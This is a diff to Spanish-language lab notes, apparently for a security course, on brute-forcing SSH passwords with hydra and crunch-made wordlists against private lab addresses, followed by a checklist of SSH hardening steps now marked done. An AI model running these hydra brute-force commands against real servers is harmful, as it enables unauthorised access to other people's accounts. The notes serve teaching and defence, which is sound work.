@@ -95,11 +95,16 @@ Instalar hydra
 hydra -l root -p admin 192.168.1.105 -t 4 ssh
 hydra -l user_name -p single_password ip -t n_threads server_type_it_will_attack
 ```
-- -l
-- -L users list
-- -p
-- -P word list en vez de una sola contraseña
-- -t
+# El usuario que vamos a atacar
+- -l 
+# Listado de usuarios
+- -L 
+# Contraseña con la que vamos a probar
+- -p 
+# Lista de posibles contraseñas word list en vez de una sola contraseña
+- -P 
+# Numero de hilos 
+- -t 
 
 ```sh
 hydra -l ssi29 -p dict.txt 192.168.56.102 -t 4 ssh # Diccionario con todas las palabras para probar
@@ -109,14 +114,14 @@ crunch 3 3 > dict.txt # Fuerza bruta de todas conbinaciones de 3 caracteres
 
 ### Defensas
 
-- [ ] Configure que solo algunos usuarios puedan entrar
-- [ ] Pruebe a cambiar el puerto del servidor de ssh
+- [x] Configure que solo algunos usuarios puedan entrar
+- [x] Pruebe a cambiar el puerto del servidor de ssh
   - Search for port in nano -w /etc/ssh/ssh_config
   - Port 889, different
-- [ ] Deshabilitar root login
-- [ ] Passwordless login - with ssh-keygen
+- [x] Deshabilitar root login
+- [x] Passwordless login - with ssh-keygen
   - Disable empty password
-- [ ] Pruebe a cambiar los parñametros de ssh que afectan a la velocidad con que un atacante puede intentar contraseñas
+- [x] Pruebe a cambiar los parñametros de ssh que afectan a la velocidad con que un atacante puede intentar contraseñas
 
 
 - Pruebe a cambiar los parametros de seg que afectan a la velocidad con que un atacante puede intentar contraseñas.
